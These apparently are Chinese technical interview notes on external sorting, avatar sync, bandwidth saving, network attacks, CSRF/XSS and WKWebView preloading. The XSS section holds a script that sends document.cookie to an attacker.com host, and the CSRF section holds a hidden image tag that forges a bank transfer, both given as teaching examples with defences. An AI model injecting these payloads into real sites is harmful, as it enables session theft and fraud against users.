    *   从磁盘上的1000万条数据文件中，读取前100万条到内存中。
    *   在内存中，使用高效的排序算法（如 **快速排序 (QuickSort)**、**堆排序 (HeapSort)** 或 **Timsort**）对这100万条数据进行排序。
    *   将排序好的这100万条数据写入磁盘上的一个临时文件（例如 `temp_file_1.sorted`）。
3.  **重复操作**：重复步骤2，继续读取接下来的100万条数据，排序后写入第二个临时文件（`temp_file_2.sorted`），以此类推。
4.  **完成分割**：直到原始文件的所有数据都被处理完毕。在这个例子中，我们会得到10个临时的、内部已有序的文件。

**这个阶段结束后，我们得到的是 `k` 个已经排好序的临时文件。**

#### **阶段二：多路归并 (Multi-way Merge)**

这是外部排序最核心、最巧妙的部分。我们的目标是将这10个有序的临时文件，合并成一个最终的有序文件，并且这个过程同样不能消耗太多内存。

1.  **输入缓冲区**：为每个临时文件（共10个）在内存中开辟一个小的输入缓冲区。我们只需要从每个文件中读取**第一个**数据元素放入各自的缓冲区。
2.  **选择最小元素**：现在内存中有10个来自不同文件开头的元素。我们需要在这10个元素中找到**最小**的那一个。
    *   **高效实现**：为了高效地找到这`k`个元素中的最小值，我们通常使用一个 **最小堆（Min-Heap）** 数据结构。将这10个元素和它们来源的文件索引一同放入最小堆。堆顶的元素永远是当前所有缓冲区中最小的。
3.  **写入与补充**：
    *   从最小堆中取出堆顶的元素（全局最小值），将它写入到最终的输出文件。
    *   查看这个最小元素来自于哪个临时文件（比如来自 `temp_file_3.sorted`）。
    *   从 `temp_file_3.sorted` 中读取**下一个**元素，并将其放入最小堆中。
4.  **循环归并**：重复步骤3，不断地“从堆顶取最小 -> 写入输出文件 -> 从来源文件补充新元素入堆”，直到所有临时文件的数据都被读取完毕。

**这个阶段结束后，最终的输出文件就是一个包含1000万条数据的、完全有序的文件。**

时间复杂度，假如分成k份，每份 m 个数据，各自排序是k*mlog m = n logm

外部排序的复杂度是，nlogk。

nlogk + n log m = n（log k + log m） = nlogn

## 比如说微信换头像，如何做到换头像之后，好友立马能看到。ios客户端面试题

微信更换头像后，好友能立马看到，这背后通常采用的是**推拉结合**的机制，即**服务器主动推送**和**客户端主动拉取**的混合策略。这种设计既保证了实时性，又兼顾了系统性能和稳定性。



### 1. 推送机制（实时性保障）



当用户 A 更换头像时，服务器会执行以下操作：

- **写入数据库：** 服务器首先会将新的头像地址写入数据库。
- **发送推送通知：** 服务器会识别出所有与用户 A 有聊天记录、或者在同一个群聊中的**在线**好友。然后，服务器会向这些在线好友的客户端发送一个**推送通知**。
- **通知内容：** 这个通知非常轻量，可能只包含一个简单的指令，比如“用户 A 的头像已更新”。

当好友（用户 B）的客户端收到这个通知后，它会立即执行**拉取操作**，从服务器下载新的头像图片，并更新到本地界面上，从而实现“秒换”的效果。



### 2. 拉取机制（容错与非实时更新）



推送机制并非万无一失，客户端可能因为离线、网络延迟或其他原因，未能及时收到推送通知。为了解决这个问题，客户端还会采用拉取机制作为补充：

- **离线拉取：** 当用户 B 重新上线时，客户端会主动向服务器发起请求，同步所有在离线期间错过的更新，包括头像更新。
- **定时拉取：** 客户端会设置一个**定时器**，每隔一段时间（例如每天或每隔几个小时），会检查好友列表中的头像是否需要更新。这确保了即使推送和离线拉取都失败，头像最终也会得到同步。
- **访问时拉取：** 当用户 B 点击进入与用户 A 的聊天界面、朋友圈或者好友详情页时，客户端会主动向服务器请求最新的用户信息，包括头像，以确保显示的是最新数据。



### 3. 技术细节与优化



这个推拉结合的方案背后还有一些重要的技术细节：

- **轻量级推送：** 推送通知只包含更新指令，不包含头像图片本身。这减少了服务器的带宽消耗和推送服务的压力。
- **缓存策略：** 客户端会缓存头像图片。即使头像更新，如果新头像与旧头像的哈希值相同，客户端无需下载，直接使用本地缓存即可。
- **长连接：** 推送通知通常依赖于与服务器维持的**长连接**（如 WebSocket 或自定义的长连接协议），以确保通知的实时送达。



## 如何使得网络传输的时候，消耗的带宽变少

### 层面一：数据本身的优化 (让数据包更小)

这是最直接的层面，核心是对我们传输的内容“减负”。

#### 1. 数据压缩 (Compression)
这是最基本也是最高效的手段。
*   **文本压缩**: 对JSON、HTML、CSS、JS等文本数据，在服务器端开启Gzip或Brotli压缩。Brotli通常比Gzip有更高的压缩率。一个典型的RESTful API返回的JSON数据，经过Gzip压缩后体积可以减少70%-80%。
*   **图片压缩**: 图片往往是带宽消耗的大户。
    *   **选择合适的格式**: 使用WebP、AVIF等现代图片格式，相比JPEG、PNG，在同等画质下体积可以显著减小

#### 2. 数据格式与序列化 (Data Format & Serialization)
选择更高效的数据交换格式。
*   **使用二进制格式**: 相比于可读性好但冗余信息较多的JSON、XML，使用像Protocol Buffers (Protobuf) 或 MessagePack 这样的二进制序列化格式。它们不仅体积更小，而且解析速度更快。例如，同一个数据结构，Protobuf序列化后的体积可能只有JSON的1/3到1/10。

### 层面二：传输协议的优化 (让传输过程更高效)

选择和利用现代网络协议的特性，可以减少额外的开销。

*   **使用 HTTP/2 或 HTTP/3 (QUIC)**:
    *   **头部压缩 (Header Compression)**: HTTP/2和HTTP/3都使用HPACK/QPACK对请求头进行压缩，对于频繁请求的场景（如API调用），可以显著减少每个请求的附加数据大小。
    *   **多路复用 (Multiplexing)**: 多个请求可以共用一个TCP/QUIC连接，避免了HTTP/1.1的队头阻塞和多次TCP握手带来的开销，提高了传输效率，间接减少了总的带宽占用时间。

### 层面三：传输行为的优化 (避免不必要的传输)

这是从业务逻辑和架构层面进行的优化，核心是“能不传就不传，能少传就少传”。

#### 1. 善用缓存 (Caching)
缓存是减少网络请求最有效的手段。
*   **客户端缓存**: 合理利用HTTP缓存策略，通过设置`Cache-Control`, `Expires`, `ETag`, `Last-Modified`等响应头，让浏览器或App客户端缓存静态资源和不常变化的API数据。对于`ETag`，如果资源未改变，服务器只需返回一个`304 Not Modified`状态码，响应体为空，极大节省了带宽。
*   **代理服务器缓存**: 在网关或代理层（如Nginx）设置缓存，对一些不频繁更新的API接口进行缓存。

## 你了解哪些网络攻击

### 一、分布式拒绝服务攻击 (DDoS - Distributed Denial-of-Service)

#### 1. 核心目标
DDoS攻击的唯一目的就是**耗尽目标的资源，使其无法响应正常用户的请求，最终导致服务瘫痪**。它追求的不是“潜入”，而是用“人海战术”把门堵死。

#### 3. 技术工作原理
攻击者（黑客）首先会通过植入恶意软件等方式，控制大量的互联网设备（个人电脑、服务器、IoT设备等），形成一个庞大的僵尸网络。然后，攻击者通过一个“命令与控制”(C&C)服务器，向所有僵尸主机下达指令，让它们在同一时间向同一个目标发起海量请求。

#### 4. 主要攻击类型

DDoS攻击主要分为三大类，它们攻击的目标资源不同：

*   **协议型攻击 (Protocol Attacks)**
    *   **目标**: 耗尽服务器或网络设备（如防火墙、负载均衡器）的**系统资源**（如内存、CPU）。
    *   **方式**: 利用网络协议（如TCP）的设计缺陷。最经典的是 **SYN Flood**：攻击者发送大量伪造的TCP连接请求（SYN包），服务器会为这些请求分配资源并等待响应。但攻击者永远不响应，导致服务器维护着大量“半开连接”，最终资源耗尽而崩溃。
    *   **效果**: 服务器看起来网络通畅，但已经因为内部资源耗尽而无法处理新的连接。

*   **应用层攻击 (Application-Layer Attacks)**
    *   **目标**: 耗尽**应用程序本身**的资源（如Web服务器进程、数据库连接池）。
    *   **方式**: 模拟正常用户的行为，但以极高的频率发起资源消耗大的请求。例如 **HTTP Flood**：大量僵尸主机反复请求一个需要复杂数据库查询的搜索页面，导致Web应用和数据库过载。这种攻击流量很小，看起来和正常访问无异，非常难以检测。
    *   **效果**: 网络和服务器系统都正常，但应用本身响应变得极慢，甚至完全卡死。

#### 5. 如何防御
1.  **CDN (内容分发网络)**: CDN本身就是一个巨大的分布式网络，可以隐藏源站IP，并利用其庞大的节点资源来吸收和分散大量的流量型攻击。
2.  **流量清洗/云防护服务**: 这是最专业的解决方案。将所有流量先导入一个“清洗中心”，该中心通过复杂的算法和硬件识别并丢弃恶意流量，只将干净的、合法的流量转发给源站服务器。例如 AWS Shield, Cloudflare。
3.  **配置防火墙/负载均衡器**: 针对协议型攻击，可以配置设备来限制半开连接数、SYN超时时间等。
4.  **应用层优化**: 对应用层攻击，可以通过限流（Rate Limiting）、验证码、IP黑白名单等方式进行缓解。

---

### 二、中间人攻击 

#### 3. 技术工作原理
攻击者必须先将自己置于受害者和目标服务器之间的网络路径上。一旦成功，所有流经的流量都会被其截获。

#### 4. 主要攻击方式

*   **ARP欺骗 (ARP Spoofing)**
    *   **场景**: 在同一个局域网内（如公司内网、公共Wi-Fi）。
    *   **原理**: 攻击者向受害者的电脑发送伪造的ARP响应包，谎称自己是网关（路由器的IP地址对应攻击者的MAC地址）。同时，也向网关发送伪造包，谎称自己是受害者。这样，受害者与互联网之间的所有双向流量都会先经过攻击者的电脑。

*   **Wi-Fi劫持 (Evil Twin)**
    *   **场景**: 公共Wi-Fi环境。
    *   **原理**: 攻击者创建一个与合法Wi-Fi名称非常相似（或完全相同）的恶意Wi-Fi热点，但不设密码或使用简单密码。一旦用户连接上这个“邪恶双胞胎”热点，攻击者就成为了他们的网关，可以监听所有流量。

*   **SSL剥离 (SSL Stripping)**
    *   **场景**: 针对HTTPS加密流量。
    *   **原理**: 当用户尝试访问一个HTTPS网站（如`https://mybank.com`）时，浏览器通常会先发出一个HTTP请求，然后服务器会将其重定向到HTTPS。攻击者拦截这个过程：
        1.  用户向服务器发起HTTP请求。
        2.  攻击者拦截请求，并自己与服务器建立一个**安全的HTTPS连接**。
        3.  服务器返回的内容，攻击者解密后，再以**不安全的HTTP形式**返回给用户。
        4.  在用户看来，他一直在用HTTP访问网站（浏览器地址栏的小锁会消失），但数据已经被攻击者完全窃听。

### 三、DNS劫持 

#### 1. 核心目标
污染DNS解析过程，**将一个合法的域名解析到一个恶意的、由攻击者控制的IP地址**。其目的是将用户引导至假冒的网站。

#### 3. 技术工作原理
当你在浏览器输入`www.google.com`时，你的设备会向DNS服务器查询这个域名对应的IP地址。攻击者通过各种手段，篡改了这个查询-响应的过程。

#### 4. 主要攻击方式

*   **本地劫持 (修改Hosts文件)**
    *   **原理**: 攻击者通过恶意软件修改受害者电脑上的`hosts`文件。这个文件的优先级高于DNS查询。攻击者在文件中加入一条记录，如 `1.2.3.4 www.mybank.com`（`1.2.3.4`是假冒网站的IP），那么这台电脑访问该银行网站时就会直接被引向假网站。

*   **路由器劫持**
    *   **原理**: 许多家用或小型办公路由器的管理密码很简单或存在漏洞。攻击者通过破解或漏洞进入路由器后台，将其DNS服务器设置修改为攻击者自己控制的恶意DNS服务器。这样，所有连接该路由器的设备都会被劫持。

*   **DNS缓存投毒 (DNS Cache Poisoning)**
    *   **原理**: 攻击者找到DNS服务器的漏洞，向其发送伪造的DNS响应。如果DNS服务器接收并缓存了这条虚假记录，那么在该缓存过期前，所有向这台DNS服务器查询该域名的用户，都会得到那个恶意的IP地址。这是影响范围最广的一种方式。



好的，这是一个非常核心的Web安全问题。您提到的“ss攻击”通常是指 **CSRF** 攻击（Cross-Site Request Forgery，跨站请求伪造），因为它和 XSS 经常被一起讨论。

我们将详细、清晰地区分这两种攻击。它们都利用了浏览器和网站的信任关系，但方式和目标完全不同。

---

### **核心区别一句话总结**

*   **CSRF (跨站请求伪造):** 攻击者**借用你的身份**，去向你信任的网站**发送恶意请求**。网站是受害者，但执行操作的是你。
*   **XSS (跨站脚本攻击):** 攻击者将**恶意代码注入**到你信任的网站里，让你在访问这个网站时，**你的浏览器**执行这段恶意代码。你是受害者。

---

### **1. CSRF (Cross-Site Request Forgery) - 跨站请求伪造**

可以把它比作：**“冒充你写信”。**

#### **核心思想**
攻击者自己无法访问你的银行账户，但他知道你登录了银行网站。于是，他诱导你点击一个链接，这个链接会偷偷地以你的名义，向银行网站发送一个转账请求。银行网站看到这个请求是你（携带着你的登录凭证Cookie）发来的，就认为是合法的，于是执行了转账。

#### **攻击流程**

1.  **用户登录：** 你登录了一个受信任的网站A（比如 `bank.com`），并且你的浏览器保存了网站A的登录凭证（Cookie）。
2.  **诱导访问：** 攻击者通过邮件、论坛帖子等方式，诱导你访问一个恶意网站B (`evil.com`)。
3.  **恶意请求：** 网站B上可能有一个看不见的图片或者一个自动提交的表单，它的目标是指向网站A的一个操作接口。
4.  **浏览器“助攻”：** 当你的浏览器请求这个图片或表单时，它会自动带上所有 `bank.com` 的Cookie。
5.  **网站A被骗：** 网站A的服务器收到这个请求，检查Cookie，发现这是一个已登录的合法用户发起的请求，于是执行了该操作（比如向攻击者转账1000元）。
6.  **用户不知情：** 整个过程你可能毫无察觉，只是点开了一个链接或者看了一张图片。

#### **简单代码示例**
攻击者在 `evil.com` 页面上放置这样一行代码：
```html
<!-- 用户一打开这个页面，浏览器就会自动向银行网站发起一个转账请求 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000" width="1" height="1" border="0">
```
这个图片是1x1像素，用户根本看不到，但浏览器会忠实地发出这个GET请求，并带上 `bank.com` 的Cookie。

#### **如何防御CSRF**

*   **Anti-CSRF Token（最重要的防御手段）：**
    *   **原理：** 服务器在给用户返回表单页面时，会生成一个独一无二、不可预测的随机字符串（Token），并将其放在表单的一个隐藏字段里，同时也在用户的Session中保存一份。
    *   **验证：** 当用户提交表单时，必须带上这个Token。服务器收到请求后，会比较表单中的Token和Session中的Token是否一致。
    *   **效果：** 攻击者在恶意网站 `evil.com` 上无法得知这个随机Token是什么，所以他伪造的请求里就没有或者有错误的Token，服务器一校验就会拒绝该请求。

*   **SameSite Cookie 属性：**
    *   这是一个新的浏览器安全策略，通过设置Cookie的 `SameSite` 属性来告诉浏览器，在跨站请求时不要携带这个Cookie。
    *   `SameSite=Strict`: 最严格，完全禁止跨站携带Cookie。
    *   `SameSite=Lax`: 比较宽松，允许在GET请求等一些导航操作中携带，但能防御住POST形式的CSRF。

*   **验证 Referer 头：**
    *   检查HTTP请求头中的 `Referer` 字段，确保请求是从合法的源域名发起的。但这个字段可以被伪造，所以不是最可靠的防御方式。

---

### **2. XSS (Cross-Site Scripting) - 跨站脚本攻击**

可以把它比作：**“在公告栏上贴有毒的小广告”。**

#### **核心思想**
攻击者发现一个你信任的网站A（比如一个论坛）有漏洞，没有对用户的输入内容进行充分检查。于是，他发布一个帖子，帖子的内容不是普通文字，而是一段恶意的JavaScript脚本。这个恶意脚本被保存在了网站A的数据库里。之后，当你访问网站A并查看这个帖子时，你的浏览器会把这段恶意脚本连同正常内容一起下载下来并执行它。

#### **攻击流程**

1.  **注入脚本：** 攻击者在一个存在XSS漏洞的网站A的输入框（如评论区、搜索框、个人资料）中，提交了一段恶意JavaScript代码。
2.  **网站存储：** 网站A没有对这段代码进行处理，直接把它当成普通文本存入了数据库。
3.  **受害者访问：** 你访问了网站A的这个页面。
4.  **浏览器执行：** 你的浏览器从网站A下载了页面内容，其中包含了攻击者注入的恶意脚本。浏览器看到 `<script>` 标签，认为这是网站A的正常代码，于是就执行了它。
5.  **实施攻击：** 这段脚本在你的浏览器中运行，它可以：
    *   窃取你的Cookie (`document.cookie`) 并发送给攻击者，攻击者可以用你的Cookie冒充你登录。
    *   修改页面内容，进行钓鱼欺诈。
    *   以你的名义执行操作（比如点赞、发帖）。

#### **简单代码示例**
攻击者在评论区提交的内容不是“写得真好！”，而是：
```html
<!-- 这个脚本会弹出你的Cookie，更恶意的脚本会将其发送到攻击者的服务器 -->
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### **如何防御XSS**

*   **输出编码/转义 (Output Encoding/Escaping)（最重要的防御手段）：**
    *   **原理：** 在将用户输入的内容显示到页面上时，对所有可能引起歧义的特殊字符进行HTML编码。
    *   **示例：** 将 `<` 转换为 `&lt;`，将 `>` 转换为 `&gt;`，将 `"` 转换为 `&quot;`。
    *   **效果：** 经过转义后，`<script>` 会变成 `&lt;script&gt;`。浏览器会把这个字符串**按原文显示出来**，而不会把它当作一个HTML标签来执行。这是修复XSS漏洞的根本方法。

*   **输入验证/过滤 (Input Validation/Sanitization)：**
    *   对用户输入的数据进行检查，拒绝或过滤掉不符合预期的内容（比如包含 `<script>` 标签的输入）。这是一种辅助性的、深度防御的措施。

*   **内容安全策略 (Content Security Policy, CSP)：**
    *   这是一种强大的现代防御机制。网站通过发送一个HTTP头，告诉浏览器只允许加载和执行来自特定来源的脚本。这样即使攻击者成功注入了内联脚本，也会因为不符合CSP策略而被浏览器拒绝执行。

---

### **CSRF vs. XSS 核心区别对照表**

| 特性         | CSRF (跨站请求伪造)                                          | XSS (跨站脚本攻击)                                       |
| :----------- | :----------------------------------------------------------- | :------------------------------------------------------- |
| **攻击目标** | 服务器端的数据和操作。                                       | 客户端（用户的浏览器）。                                 |
| **攻击方式** | 伪造一个合法的请求，诱导用户浏览器发送。                     | 向网页中注入恶意的脚本代码。                             |
| **信任关系** | 利用了**服务器对用户浏览器**的信任（信任Cookie）。           | 利用了**用户对受信任网站**的信任（信任网站返回的代码）。 |
| **代码位置** | 恶意代码在**攻击者的网站**上。                               | 恶意代码被注入并存储在**受害网站**上，或在URL中。        |
| **核心比喻** | 冒充你写信给银行。                                           | 在银行的公告栏上贴有毒广告。                             |
| **防御核心** | 验证请求的来源是否合法（Anti-CSRF Token, SameSite Cookie）。 | 永远不信任任何用户输入，对输出到页面的内容进行编码转义。 |

## ios客户端中有一个网页中有很多，要快速点进点出，怎么做到比较快的加载

### 问题分析：为什么“慢”？

首先要明白，每次点击链接都创建一个新的`WKWebView`实例并加载URL，慢在哪里：

1.  **`WKWebView`初始化开销大**：创建一个`WKWebView`实例不仅仅是`alloc-init`那么简单。系统需要为其分配独立的进程（`WebContent`进程），建立跨进程通信机制。这是一个相对较重的操作。
2.  **网络请求耗时**：DNS解析、建立TCP连接、TLS握手、下载HTML主文档、再下载CSS/JS/图片等资源，整个过程涉及多次网络往返，非常耗时。
3.  **页面渲染耗时**：浏览器内核需要解析HTML构建DOM树，解析CSS构建CSSOM树，合并成渲染树，再进行布局和绘制。这个过程会消耗大量CPU和内存。

“快速点进点出”的场景下，这些开销会被反复触发，导致体验非常糟糕。

### 核心策略：预加载、复用、缓存

针对以上痛点，我们的优化策略可以归结为三大方向：

1.  **预加载 (Pre-loading)**：不要等用户点击了再开始加载，提前做一些准备工作。
2.  **对象复用 (Reusability)**：不要频繁创建和销毁`WKWebView`，建立一个“对象池”来管理它们。
3.  **资源缓存 (Caching)**：将Web资源离线到本地，将网络加载变为本地IO加载。

---

### 具体实现方案 (从基础到进阶)

#### 方案一：`WKWebView`对象池 (最核心、最常用的方案)

这是解决该问题的基石。既然`WKWebView`初始化开销大，那我们就提前创建好一批，放在一个池子里循环使用。

**实现思路:**

1.  **创建对象池**: 创建一个全局或与业务绑定的单例 `WebViewPool`。池中用一个数组（如 `NSMutableArray`）来存放空闲的`WKWebView`实例。
2.  **获取WebView**:
    *   当需要展示网页时，不直接`[[WKWebView alloc] init]`，而是向 `WebViewPool` 请求一个`WKWebView`实例。
    *   如果池中有可用的实例，就取出来用。
    *   如果池中为空，再创建一个新的实例。
3.  **归还WebView**:
    *   当用户“点出”（即关闭网页所在的控制器）时，**不要销毁这个`WKWebView`**。
    *   **重置其状态**: 这是非常关键的一步！你需要清空它的内容、移除旧的代理和监听、清除Cookie（如果需要隔离的话）。一个简单有效的重置方法是加载一个空白页面：`[webView loadHTMLString:@"" baseURL:nil];`
    *   将重置干净的`WKWebView`实例放回池中，以备下次使用。

**优点**:
*   极大地减少了`WKWebView`的初始化和销毁开销。
*   第二次及以后的加载速度会有显著提升。

**注意事项**:
*   池的大小需要限制，避免内存占用过高。
*   归还时必须彻底重置状态，防止上一个页面的JS、Cookie、滚动位置等状态污染下一个页面。

#### 方案二：预热与预加载 (在对象池基础上的进阶)

对象池解决了初始化的问题，但网络加载耗时依然存在。我们可以在用户做出点击动作之前，就悄悄开始加载。

**实现思路:**

1.  **时机选择**:
    *   **进入列表页时**: 当用户进入那个“有很多链接”的列表页面时，就可以从对象池中取出一个`WKWebView`，预先加载第一个链接或最可能被点击的链接。
    *   **滚动到可见区域时**: 当列表中的某个链接滚动到屏幕可见区域时，可以认为用户很可能会点击它。此时，可以开始在后台静默加载这个链接。
    *   **长按或悬停时** (如果UI支持): 当用户手指即将触摸或触摸链接时，可以触发预加载。
2.  **执行加载**:
    *   从对象池中取出一个空闲的`WKWebView`。
    *   在后台执行 `[webView loadRequest:...]`。
    *   当用户真正点击这个链接时，这个`WKWebView`可能已经加载了一部分甚至全部内容。你只需要将这个正在加载或已加载完成的`WKWebView`展示给用户即可。

#### 方案三：资源离线化 (终极方案)

对于那些内容相对固定、更新不频繁的核心H5页面，可以将它们的静态资源（HTML/CSS/JS/图片）打包内置在App中，或者在App启动时后台下载。

**实现思路:**

1.  **打包资源**: 与前端约定，将H5页面所需的所有静态资源打包成一个压缩包（如.zip）。
2.  **下发与解压**: App通过内置或后台下载的方式获取这个资源包，并解压到本地沙盒目录。
3.  **拦截请求**:
    *   **使用`WKURLSchemeHandler`**: 这是苹果官方推荐的方案。你可以自定义一个Scheme（如`my-app-scheme://`），并注册一个`SchemeHandler`。当`WKWebView`请求这个Scheme的资源时，系统会回调你的Handler，你就可以从本地沙盒读取对应的文件数据并返回给WebView。

